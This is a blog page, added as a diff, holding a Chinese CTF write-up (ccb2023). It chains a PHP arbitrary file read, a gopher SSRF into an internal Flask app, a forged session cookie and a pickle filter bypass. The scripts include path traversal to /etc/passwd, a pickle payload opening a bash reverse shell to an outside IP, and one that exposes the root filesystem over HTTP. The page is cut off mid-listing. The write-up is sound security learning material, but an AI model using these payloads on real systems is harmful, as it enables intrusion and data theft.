@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="lhb">
+    
+    <title>
+        
+            php-python结合的一道题目 |
+        
+        Jerem1ah&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/fontawesome/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/css/brands.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066cc","logo":"/images/logo.svg","favicon":"/images/logo.svg","avatar":"/images/avatar.svg","font_size":null,"font_family":null,"hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"header_transparent":false,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving.","font_color":null,"hitokoto":false},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":false,"preload":false},"code_copy":{},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"side_tools":{},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.7"},"waline":{"server_url":null,"reaction":false,"version":2}},"post":{"author_label":{"enable":true,"auto":true,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"enable":false,"wordcount":false,"min2read":false},"img_align":"left","copyright_info":false},"version":"3.5.2"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"};
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="logo-title" href="/">
+               Jerem1ah&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            <div class="article-title">
+                <span class="title-hover-animation">php-python结合的一道题目</span>
+            </div>
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/avatar.svg">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">lhb</span>
+                            
+                                <span class="author-label">Lv4</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            
+<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        
+            <i class="fa-regular fa-calendar-plus"></i>&nbsp;
+        
+        <span class="pc">2023-09-07 21:03:36</span>
+        <span class="mobile">2023-09-07 21:03</span>
+    </span>
+    
+        <span class="article-update-date article-meta-item">
+        <i class="fas fa-file-pen"></i>&nbsp;
+        <span class="pc">2023-09-17 23:03:54</span>
+    </span>
+    
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content keep-markdown-body">
+                <h1 id="ccb2023-php-python结合的一道题目"><a href="#ccb2023-php-python结合的一道题目" class="headerlink" title="[ccb2023] php-python结合的一道题目"></a>[ccb2023] php-python结合的一道题目</h1><h5 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h5><p>这个题质量非常高的一道题目了。php源码审计，文件包含读取文件，还涉及png藏7z压缩包，bash_history命令记录，然后就是内网ssrf，session对象为字典对象，python的pickle反序列化以及绕过，session伪造，gopher协议，环境不出网（应该，)反弹shell没成功。考察点如此之多，很考验综合能力，最后还是在学弟的帮助下赛后写出了呜呜呜太菜了。还是要吐槽一句ldy不给我报名。。</p>
+<h5 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h5><p>题目源码：</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HINT:POST n = range(1,10)&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$image</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;这里什么也没有，或许吧。&quot;</span>;</span><br><span class="line"><span class="variable">$allow</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">10</span>);</span><br><span class="line"><span class="title function_ invoke__">shuffle</span>(<span class="variable">$allow</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_POST</span>[<span class="string">&#x27;n&#x27;</span>] == <span class="variable">$allow</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$image</span>))&#123;</span><br><span class="line">	<span class="variable">$image</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$image</span>);</span><br><span class="line">    	<span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$image</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;your image is&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$image</span>).<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$data</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;tupian.png&quot;</span>));</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;no image get,default img is dHVwaWFuLHBuZw==&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,<span class="subst">$data</span>&#x27;/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>看到这里，首先把图片打下来，根据题目提示分析图片。然后再读取任意文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zeif2s8oymjc095x0p5.cloudeci1.ichunqiu.com/&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    response = requests.post(url,data=&#123;<span class="string">&#x27;n&#x27;</span>:<span class="number">1</span>&#125;).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;no image get&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        res = re.findall(<span class="string">&#x27;base64,(.*?)\&#x27;/&gt;&#x27;</span>,response)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;image.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(base64.b64decode(res))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/31php-python%E7%BB%93%E5%90%88%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/image-20230907200135674.png" alt="image-20230907200135674"></p>
+<p>更具提示图片里有压缩包，010editor查看，找png结尾6082，发现7z，解压里面时secret.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M0sT_D4nger0us.php</span><br></pre></td></tr></table></figure>
+
+<p>这个是ssrf访问内网环境的，利用文件读取漏洞看一下内容为</p>
+<p>M0sT_D4nger0us.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接着任意文件读取直接上脚本，改动file变量就能任意读取了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file = <span class="string">&#x27;../../../../etc/passwd&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://eci-2zeif2s8oymjc095x0p5.cloudeci1.ichunqiu.com/?image=&#x27;</span>+base64.b64encode(file.encode()).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    response = requests.post(url,data=&#123;<span class="string">&#x27;n&#x27;</span>:<span class="number">1</span>&#125;).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;your image&#x27;</span> <span class="keyword">in</span> response:</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        res = re.findall(<span class="string">&#x27;base64,(.*?)\&#x27;/&gt;&#x27;</span>,response)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(base64.b64decode(res).decode())</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>至此，题目提供的源码信息基本上用完了。发现了几个新的信息，M0sT_D4nger0us.php文件</p>
+<p>然后题目提示bash的历史记录。</p>
+<p>文件读取先读了一下&#x2F;etc&#x2F;passwd，发现secret用户。然后读取&#x2F;home&#x2F;secret&#x2F;.bash_history问价。得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /home/secret/Ez_Pickle/app.py</span><br></pre></td></tr></table></figure>
+
+<p>至此信息明了，app.py开了一个内网环境，需要ssrf利用M0sT_D4nger0us.php打内网。</p>
+<p>app.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;idontwantyoutoknowthis&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span></span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    u = pickle.dumps(User())</span><br><span class="line">    session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这里啥都没有，我只知道有个路由的名字和python常用的的一个序列化的包的名字一样哎&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pickle&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span></span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pickle_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            code = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">b&#x27;built&#x27;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">b&#x27;setstate&#x27;</span> <span class="keyword">in</span> code <span class="keyword">or</span> <span class="string">b&#x27;flag&#x27;</span> <span class="keyword">in</span> code:</span><br><span class="line">                <span class="built_in">print</span>(code)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;what do you want???&quot;</span></span><br><span class="line">            result=pickle.loads(code)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;almost there&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5555</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看源码发现需要两个点的绕过，<code>isinstance(u, dict)</code>其一， <code>if b&#39;R&#39; in code or b&#39;built&#39; in code or b&#39;setstate&#39; in code or b&#39;flag&#39; in code:</code>其二，然后最后也没发现User类有何用，可能我的解法不一样。</p>
+<p>第一个绕过我用的flask_session_cookie_manager3.py，发现好像没法加密字典对象。耽误了不少时间去绕过。于是我本地起了个flask的服务，发现可以给session赋值一个字典对象。于是乎</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;idontwantyoutoknowthis&quot;</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;RRR&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span></span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    payload = base64.b64encode(data)</span><br><span class="line">    a = &#123;</span><br><span class="line">        <span class="string">&#x27;b&#x27;</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    session[<span class="string">&#x27;a&#x27;</span>] = a</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这里啥都没有，我只知道有个路由的名字和python常用的的一个序列化的包的名字一样哎&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>先来了一个RRR看是否出现提示已经绕过isinstance(u, dict)，结果本地成功了，远程暂时不谈。也就是可以绕过了。</p>
+<p>然后就是gopher协议去访问内网的环境了，这个之前打过内网的似乎用过，但是没脚本，借用了wp学弟（呜呜呜tql）的脚本打的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">cookie = requests.get(<span class="string">&#x27;http://127.0.0.1:5555&#x27;</span>).cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line"><span class="comment"># print(cookie)</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">&quot;&quot;&quot;GET /pickle HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: &#123;&#125;</span></span><br><span class="line"><span class="string">Cookie: session=&quot;&quot;&quot;</span>+cookie+<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">Payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">        Payload += <span class="string">&#x27;%250d%250a&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Payload += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;%25&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(Payload)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2zeif2s8oymjc095x0p5.cloudeci1.ichunqiu.com/M0sT_D4nger0us.php?url=gopher://127.0.0.1:5555/_&quot;</span></span><br><span class="line">res = requests.get(url=url+Payload)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>
+
+<p>刚开始有些失误，经过多次尝试才出现”what do you want???”的提示表示远程也成功绕过了，也验证了secret_key的确就是源码里的那个，刚开始怀疑不是那个，去文件里扒了很久。。。</p>
+<p>这时候擦不多还剩半个小时时间就结束了，，，来不及了，最后反序列化挺简单，直接上代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/39.105.51.11/7779 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data))</span><br></pre></td></tr></table></figure>
+
+<p>由于可能靶机不出网，导致没弹成功。试了sleep能成功执行命令找不到回显。最后的打法是国赛的做法，开http.server开目录访问服务，5556端口，直接内网访问这个端口就读取了目录根目录内容。</p>
+<p>本地flask的一部分.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;cd /;python3 -m http.server 5556;sleep 5&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span></span>)</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_handler</span>():</span><br><span class="line">    payload = base64.b64encode(data)</span><br><span class="line">    a = &#123;</span><br><span class="line">        <span class="string">&#x27;b&#x27;</span>:payload</span><br><span class="line">    &#125;</span><br><span class="line">    session[<span class="string">&#x27;a&#x27;</span>] = a</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这里啥都没有，我只知道有个路由的名字和python常用的的一个序列化的包的名字一样哎&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Directory listing for /<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Directory listing for /<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;bin/&quot;</span>&gt;</span>bin/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;boot/&quot;</span>&gt;</span>boot/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;dev/&quot;</span>&gt;</span>dev/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;etc/&quot;</span>&gt;</span>etc/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;ffl14aaaaaaagg&quot;</span>&gt;</span>ffl14aaaaaaagg<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;home/&quot;</span>&gt;</span>home/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span 